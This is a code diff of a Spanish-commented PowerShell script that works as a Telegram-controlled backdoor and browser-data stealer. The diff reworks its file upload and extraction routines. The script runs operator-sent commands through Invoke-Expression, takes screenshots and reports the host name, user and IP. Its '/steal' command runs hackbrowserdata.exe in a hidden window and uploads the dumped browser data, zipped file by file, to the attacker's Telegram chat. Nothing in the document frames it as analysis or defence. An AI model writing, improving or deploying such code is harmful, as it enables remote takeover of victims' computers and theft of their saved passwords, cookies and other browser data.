@@ -20,93 +20,96 @@ function Write-Log {
     Write-Host $line
 }
 
-# Desactivar webhook primero (IMPORTANTE para evitar error 409)
+# Desactivar webhook y limpiar updates pendientes
 try {
-    Invoke-RestMethod -Uri "$ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post | Out-Null
-    Write-Log "Webhook desactivado correctamente"
-    Start-Sleep -Seconds 2
+    Invoke-RestMethod -Uri "$ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post -ErrorAction Stop | Out-Null
+    Write-Log "Webhook desactivado"
+    Start-Sleep -Seconds 3
 } catch {
-    Write-Log "No se pudo desactivar webhook: $($_.Exception.Message)"
+    Write-Log "Error desactivando webhook: $($_.Exception.Message)"
 }
 
 Add-Type -AssemblyName System.Windows.Forms, System.Drawing, System.Net.Http
 
-# Usar HttpClient para enviar archivos (compatible con PowerShell 5.1)
 $httpClient = New-Object System.Net.Http.HttpClient
 
 function Send-Message {
-    param([string]$Text, [string]$ChatIdOverride = $ChatId)
+    param([string]$Text, [string]$TargetChatId = $ChatId)
     try {
-        # Telegram limita a 4096 caracteres
-        if ($Text.Length -gt 4000) {
-            $Text = $Text.Substring(0, 4000) + "`n...(mensaje truncado, usa /cmd para ver completo)"
-        }
+        if ($Text.Length -gt 4000) { $Text = $Text.Substring(0, 4000) + "`n...(truncado)" }
         
-        # Escapar caracteres problemáticos para JSON
-        $Text = $Text -replace '\\', '\\' -replace '"', '\"' -replace "`n", '\n' -replace "`r", '\r' -replace "`t", '\t'
-        
-        $json = "{`"chat_id`":`"$ChatIdOverride`",`"text`":`"$Text`"}"
+        $json = @{chat_id=$TargetChatId; text=$Text} | ConvertTo-Json -Compress
         $content = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
         $response = $httpClient.PostAsync("$ApiUrl/sendMessage", $content).Result
+        
+        $content.Dispose()
+        if (-not $response.IsSuccessStatusCode) {
+            Write-Log "Error sendMessage: $($response.StatusCode)"
+        }
         return $response.IsSuccessStatusCode
     } catch {
-        Write-Log "Error enviando mensaje: $($_.Exception.Message)"
+        Write-Log "Error Send-Message: $($_.Exception.Message)"
         return $false
     }
 }
 
 function Send-File {
-    param([string]$Path, [string]$Caption="", [string]$ChatIdOverride = $ChatId)
+    param(
+        [string]$Path, 
+        [string]$Caption="", 
+        [string]$TargetChatId = $ChatId
+    )
+    
     try {
-        if (-not (Test-Path $Path)) { 
+        if (-not (Test-Path $Path)) {
             Write-Log "Archivo no existe: $Path"
-            return $false 
+            return $false
         }
         
         $fileInfo = Get-Item $Path
         if ($fileInfo.Length -gt 49MB) {
-            Write-Log "Archivo demasiado grande: $($fileInfo.Length) bytes"
-            Send-Message -Text "Archivo demasiado grande para enviar: $($fileInfo.Name)" -ChatIdOverride $ChatIdOverride
+            Write-Log "Archivo muy grande: $($fileInfo.Length)"
+            Send-Message -Text "Archivo muy grande: $($fileInfo.Name)" -TargetChatId $TargetChatId
             return $false
         }
         
-        # Crear multipart form manualmente para PowerShell 5.1
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $header = "--$boundary`r`nContent-Disposition: form-data; name=`"chat_id`"`r`n`r`n$ChatIdOverride`r`n"
+        # Crear contenido multipart correctamente para PowerShell 5.1
+        $content = New-Object System.Net.Http.MultipartFormDataContent
         
+        # Agregar chat_id
+        $chatIdContent = New-Object System.Net.Http.StringContent($TargetChatId)
+        $content.Add($chatIdContent, "chat_id")
+        
+        # Agregar caption si existe
         if ($Caption) {
-            $header += "--$boundary`r`nContent-Disposition: form-data; name=`"caption`"`r`n`r`n$Caption`r`n"
+            $captionContent = New-Object System.Net.Http.StringContent($Caption)
+            $content.Add($captionContent, "caption")
         }
         
-        $fileHeader = "--$boundary`r`nContent-Disposition: form-data; name=`"document`"; filename=`"$($fileInfo.Name)`"`r`nContent-Type: application/octet-stream`r`n`r`n"
-        $footer = "`r`n--$boundary--`r`n"
-        
+        # Agregar archivo
         $fileBytes = [System.IO.File]::ReadAllBytes($Path)
-        $headerBytes = [System.Text.Encoding]::UTF8.GetBytes($header)
-        $fileHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($fileHeader)
-        $footerBytes = [System.Text.Encoding]::UTF8.GetBytes($footer)
+        $fileContent = New-Object System.Net.Http.ByteArrayContent($fileBytes)
+        $fileContent.Headers.ContentDisposition = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue("form-data")
+        $fileContent.Headers.ContentDisposition.Name = "document"
+        $fileContent.Headers.ContentDisposition.FileName = $fileInfo.Name
+        $content.Add($fileContent, "document")
         
-        $contentBytes = New-Object byte[] ($headerBytes.Length + $fileHeaderBytes.Length + $fileBytes.Length + $footerBytes.Length)
-        [System.Buffer]::BlockCopy($headerBytes, 0, $contentBytes, 0, $headerBytes.Length)
-        [System.Buffer]::BlockCopy($fileHeaderBytes, 0, $contentBytes, $headerBytes.Length, $fileHeaderBytes.Length)
-        [System.Buffer]::BlockCopy($fileBytes, 0, $contentBytes, ($headerBytes.Length + $fileHeaderBytes.Length), $fileBytes.Length)
-        [System.Buffer]::BlockCopy($footerBytes, 0, $contentBytes, ($headerBytes.Length + $fileHeaderBytes.Length + $fileBytes.Length), $footerBytes.Length)
-        
-        $content = New-Object System.Net.Http.ByteArrayContent($contentBytes)
-        $content.Headers.ContentType = New-Object System.Net.Http.Headers.MediaTypeHeaderValue("multipart/form-data")
-        $content.Headers.ContentType.Parameters.Add((New-Object System.Net.Http.Headers.NameValueHeaderValue("boundary", $boundary)))
-        
+        # Enviar
         $response = $httpClient.PostAsync("$ApiUrl/sendDocument", $content).Result
+        
         $content.Dispose()
         
         if (-not $response.IsSuccessStatusCode) {
-            $errorContent = $response.Content.ReadAsStringAsync().Result
-            Write-Log "Error enviando archivo: $($response.StatusCode) - $errorContent"
+            $errorBody = $response.Content.ReadAsStringAsync().Result
+            Write-Log "Error enviando archivo $($fileInfo.Name): $($response.StatusCode) - $errorBody"
             return $false
         }
+        
+        Write-Log "Archivo enviado OK: $($fileInfo.Name)"
         return $true
+        
     } catch {
-        Write-Log "Error enviando archivo: $($_.Exception.Message)"
+        Write-Log "Error Send-File: $($_.Exception.Message)"
         return $false
     }
 }
@@ -115,7 +118,7 @@ function Get-Info {
     try {
         $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
     } catch { $ip = "Desconocida" }
-    return "PC: $env:COMPUTERNAME | Usuario: $env:USERNAME | IP: $ip"
+    return "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip"
 }
 
 function Take-Screenshot {
@@ -144,11 +147,11 @@ function Take-Screenshot {
 function Run-Steal {
     param([string]$TargetChatId = $ChatId)
     
-    Write-Log "Iniciando extraccion..."
-    Send-Message -Text "Extrayendo datos de navegadores..." -ChatIdOverride $TargetChatId
+    Send-Message -Text "Extrayendo datos..." -TargetChatId $TargetChatId
+    Write-Log "Iniciando extraccion"
     
     if (-not (Test-Path $HackPath)) {
-        Send-Message -Text "Error: No se encuentra hackbrowserdata.exe" -ChatIdOverride $TargetChatId
+        Send-Message -Text "Error: hackbrowserdata.exe no encontrado" -TargetChatId $TargetChatId
         return
     }
     
@@ -156,10 +159,10 @@ function Run-Steal {
     New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
     
     try {
+        # Ejecutar SIN --zip para obtener archivos sueltos
         $psi = New-Object System.Diagnostics.ProcessStartInfo
         $psi.FileName = $HackPath
-        $psi.Arguments = "dump -d `"$outputDir`" -f json --zip"
-        $psi.WorkingDirectory = $outputDir
+        $psi.Arguments = "dump -d `"$outputDir`" -f json"
         $psi.CreateNoWindow = $true
         $psi.WindowStyle = 'Hidden'
         $psi.UseShellExecute = $false
@@ -167,85 +170,92 @@ function Run-Steal {
         $psi.RedirectStandardError = $true
         
         $proc = [System.Diagnostics.Process]::Start($psi)
-        $proc.WaitForExit(180000)  # 3 minutos timeout
+        $proc.WaitForExit(180000)
         
         if (-not $proc.HasExited) {
             $proc.Kill()
-            Send-Message -Text "Timeout esperando extraccion" -ChatIdOverride $TargetChatId
+            Send-Message -Text "Timeout en extraccion" -TargetChatId $TargetChatId
             return
         }
         
-        $stdout = $proc.StandardOutput.ReadToEnd()
         $stderr = $proc.StandardError.ReadToEnd()
-        Write-Log "HackBrowserData exit code: $($proc.ExitCode)"
-        if ($stderr) { Write-Log "Stderr: $stderr" }
+        if ($stderr) { Write-Log "HackBrowserData: $stderr" }
         
-        # Buscar ZIP generado
-        $zipFile = Get-ChildItem -Path $outputDir -Filter "*.zip" | Select-Object -First 1
+        # Buscar JSONs
+        $jsonFiles = Get-ChildItem -Path $outputDir -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
         
-        if ($zipFile) {
-            Write-Log "Enviando ZIP: $($zipFile.Name) ($([math]::Round($zipFile.Length/1MB, 2)) MB)"
-            if (Send-File -Path $zipFile.FullName -Caption "Datos extraidos - $($zipFile.Name)" -ChatIdOverride $TargetChatId) {
-                Send-Message -Text "Extraccion completada y enviada." -ChatIdOverride $TargetChatId
-            } else {
-                Send-Message -Text "Error enviando el archivo ZIP." -ChatIdOverride $TargetChatId
-            }
-        } else {
-            # Si no hay ZIP, buscar JSONs
-            $jsonFiles = Get-ChildItem -Path $outputDir -Filter "*.json" -Recurse
-            if ($jsonFiles) {
-                $sent = 0
-                foreach ($json in $jsonFiles) {
-                    if ($json.Length -lt 49MB) {
-                        if (Send-File -Path $json.FullName -Caption $json.Name -ChatIdOverride $TargetChatId) {
-                            $sent++
-                        }
-                        Start-Sleep -Milliseconds 500
-                    }
+        if (-not $jsonFiles) {
+            Send-Message -Text "No se generaron archivos JSON" -TargetChatId $TargetChatId
+            Remove-Item $outputDir -Recurse -Force -ErrorAction SilentlyContinue
+            return
+        }
+        
+        Write-Log "Encontrados $($jsonFiles.Count) archivos JSON"
+        $sent = 0
+        
+        foreach ($json in $jsonFiles) {
+            try {
+                # Comprimir individualmente
+                $zipPath = Join-Path $env:TEMP "$($json.BaseName).zip"
+                
+                if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
+                
+                Compress-Archive -Path $json.FullName -DestinationPath $zipPath -Force -CompressionLevel Optimal
+                
+                # Renombrar caption (quitar .json)
+                $caption = $json.BaseName  # Esto quita la extension .json
+                
+                if (Send-File -Path $zipPath -Caption $caption -TargetChatId $TargetChatId) {
+                    $sent++
                 }
-                Send-Message -Text "Enviados $sent archivos JSON." -ChatIdOverride $TargetChatId
-            } else {
-                Send-Message -Text "No se generaron archivos de datos." -ChatIdOverride $TargetChatId
+                
+                Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+                Start-Sleep -Milliseconds 800  # Evitar rate limit
+                
+            } catch {
+                Write-Log "Error procesando $($json.Name): $($_.Exception.Message)"
             }
         }
         
-        Remove-Item -Path $outputDir -Recurse -Force -ErrorAction SilentlyContinue
+        Send-Message -Text "Extraccion completada. Enviados: $sent de $($jsonFiles.Count)" -TargetChatId $TargetChatId
+        Remove-Item $outputDir -Recurse -Force -ErrorAction SilentlyContinue
         
     } catch {
-        Write-Log "Error en Run-Steal: $($_.Exception.Message)"
-        Send-Message -Text "Error: $($_.Exception.Message)" -ChatIdOverride $TargetChatId
+        Write-Log "Error Run-Steal: $($_.Exception.Message)"
+        Send-Message -Text "Error: $($_.Exception.Message)" -TargetChatId $TargetChatId
     }
 }
 
-function Execute-Command {
+function Execute-Cmd {
     param([string]$Command, [string]$TargetChatId = $ChatId)
     
     Write-Log "Ejecutando: $Command"
     
     try {
-        # Crear archivo temporal para la salida
-        $tempFile = Join-Path $env:TEMP "cmd_output_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
-        
-        # Ejecutar comando y guardar en archivo
         $output = Invoke-Expression $Command 2>&1 | Out-String
         
-        # Guardar en archivo con info del comando
-        $content = "Comando ejecutado: $Command`nFecha: $(Get-Date)`n$('='*50)`n`n$output"
-        [System.IO.File]::WriteAllText($tempFile, $content)
+        if ([string]::IsNullOrWhiteSpace($output)) {
+            $output = "(comando ejecutado sin salida)"
+        }
+        
+        # Guardar en archivo temporal
+        $tempFile = Join-Path $env:TEMP "cmd_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
+        $content = "Comando: $Command`nFecha: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n$('='*50)`n`n$output"
+        [System.IO.File]::WriteAllText($tempFile, $content, [System.Text.Encoding]::UTF8)
         
         # Enviar como archivo
-        if (Send-File -Path $tempFile -Caption "Salida de: $Command" -ChatIdOverride $TargetChatId) {
-            # Enviar resumen corto tambien
-            $summary = if ($output.Length -gt 200) { $output.Substring(0, 200) + "..." } else { $output }
-            Send-Message -Text "Comando ejecutado.`nResumen:`n$summary" -ChatIdOverride $TargetChatId
+        if (Send-File -Path $tempFile -Caption "Resultado de: $Command" -TargetChatId $TargetChatId) {
+            # Enviar confirmacion breve
+            $lines = $output -split "`n" | Where-Object { $_.Trim() } | Select-Object -First 3
+            $preview = ($lines -join "`n")
+            if ($preview.Length -gt 100) { $preview = $preview.Substring(0, 100) + "..." }
+            Send-Message -Text "Comando ejecutado. Archivo enviado.`nPreview:`n$preview" -TargetChatId $TargetChatId
         }
         
         Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
         
     } catch {
-        $errorMsg = "Error ejecutando comando: $($_.Exception.Message)"
-        Write-Log $errorMsg
-        Send-Message -Text $errorMsg -ChatIdOverride $TargetChatId
+        Send-Message -Text "Error ejecutando comando: $($_.Exception.Message)" -TargetChatId $TargetChatId
     }
 }
 
@@ -256,20 +266,16 @@ function Process-Command {
     $cmd = $Text.Trim()
     $cmdLower = $cmd.ToLower()
     
-    # Extraer comando base y argumentos
-    if ($cmdLower -match '^(/[a-z]+)\s*(.*)') {
+    # Separar comando y argumentos
+    if ($cmdLower -match '^(/?[a-z]+)\s*(.*)') {
         $baseCmd = $Matches[1]
-        $args = $Matches[2]
-    } elseif ($cmdLower -match '^([a-z]+)\s*(.*)') {
-        $baseCmd = $Matches[1]
-        $args = $Matches[2]
+        $args = $Matches[2].Trim()
     } else {
-        $baseCmd = $cmdLower
-        $args = ""
+        return
     }
     
     switch ($baseCmd) {
-        { $_ -in '/ls', 'ls' } {
+        { $_ -in 'ls', '/ls' } {
             try {
                 $items = Get-ChildItem | Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String
                 Send-Message -Text "Directorio: $(Get-Location)`n`n$items"
@@ -278,59 +284,58 @@ function Process-Command {
             }
         }
         
-        { $_ -in '/cmd', 'cmd' } {
+        { $_ -in 'cmd', '/cmd' } {
             if ($args) {
-                Execute-Command -Command $args
+                Execute-Cmd -Command $args
             } else {
-                Send-Message -Text "Uso: /cmd <comando a ejecutar>"
+                Send-Message -Text "Uso: /cmd <comando>"
             }
         }
         
-        { $_ -in '/cd', 'cd' } {
+        { $_ -in 'cd', '/cd' } {
             if ($args) {
                 try {
                     Set-Location $args -ErrorAction Stop
-                    Send-Message -Text "Directorio actual: $(Get-Location)"
+                    Send-Message -Text "Ahora en: $(Get-Location)"
                 } catch {
-                    Send-Message -Text "Error: No se pudo cambiar a '$args'"
+                    Send-Message -Text "Error: No se pudo ir a '$args'"
                 }
             } else {
                 Send-Message -Text "Uso: /cd <ruta>"
             }
         }
         
-        { $_ -in '/pwd', 'pwd' } {
-            Send-Message -Text "Directorio actual: $(Get-Location)"
+        { $_ -in 'pwd', '/pwd' } {
+            Send-Message -Text "Directorio: $(Get-Location)"
         }
         
-        { $_ -in '/steal', 'steal' } {
+        { $_ -in 'steal', '/steal' } {
             Run-Steal
         }
         
-        { $_ -in '/captura', 'captura' } {
-            Send-Message -Text "Capturando pantalla..."
+        { $_ -in 'captura', '/captura' } {
+            Send-Message -Text "Capturando..."
             if (-not (Take-Screenshot)) {
-                Send-Message -Text "Error al capturar pantalla"
+                Send-Message -Text "Error al capturar"
             }
         }
         
-        { $_ -in '/info', 'info' } {
+        { $_ -in 'info', '/info' } {
             Send-Message -Text (Get-Info)
         }
         
-        { $_ -in '/help', 'help' } {
-            $help = @'
+        { $_ -in 'help', '/help' } {
+            Send-Message -Text @'
 Comandos:
 /ls - Listar archivos
-/cmd <comando> - Ejecutar comando (resultado en .txt)
-/cd <ruta> - Cambiar directorio  
+/cmd <comando> - Ejecutar (resultado en .txt)
+/cd <ruta> - Cambiar directorio
 /pwd - Directorio actual
-/steal - Extraer datos navegadores
+/steal - Extraer datos (cada archivo comprimido individual)
 /captura - Screenshot
 /info - Info del sistema
 /help - Esta ayuda
 '@
-            Send-Message -Text $help
         }
         
         default {
@@ -343,13 +348,13 @@ Comandos:
 Write-Log "=== BOT INICIADO ==="
 Write-Log "ChatId: $ChatId"
 
-Send-Message -Text "Bot iniciado - $(Get-Info)"
+Send-Message -Text "Bot online - $(Get-Info)"
 
 $lastUpdateId = 0
 
 while ($true) {
     try {
-        $url = "$ApiUrl/getUpdates?offset=$($lastUpdateId + 1)&limit=10"
+        $url = "$ApiUrl/getUpdates?offset=$($lastUpdateId + 1)&limit=5"
         $response = Invoke-RestMethod -Uri $url -TimeoutSec 60
         
         if ($response.ok -and $response.result.Count -gt 0) {
@@ -357,24 +362,23 @@ while ($true) {
                 $lastUpdateId = $update.update_id
                 $message = $update.message
                 
-                if ($null -eq $message -or $null -eq $message.text) { continue }
+                if ($null -eq $message -or [string]::IsNullOrEmpty($message.text)) { continue }
                 
                 $msgChatId = [string]$message.chat.id
-                $msgText = $message.text
                 
                 if ($msgChatId -eq $ChatId) {
-                    Process-Command -Text $msgText -FromChatId $msgChatId
+                    Process-Command -Text $message.text -FromChatId $msgChatId
                 } else {
-                    Write-Log "IGNORADO de chat: $msgChatId"
+                    Write-Log "Mensaje de otro chat: $msgChatId (esperado: $ChatId)"
                 }
             }
         }
     } catch {
-        $errMsg = $_.Exception.Message
-        if ($errMsg -notlike "*409*") {  # No loguear error 409 constantemente
-            Write-Log "Error: $errMsg"
+        $err = $_.Exception.Message
+        if ($err -notlike "*409*") {
+            Write-Log "Error bucle: $err"
         }
-        Start-Sleep -Seconds 3
+        Start-Sleep -Seconds 2
     }
     
     Start-Sleep -Milliseconds 500
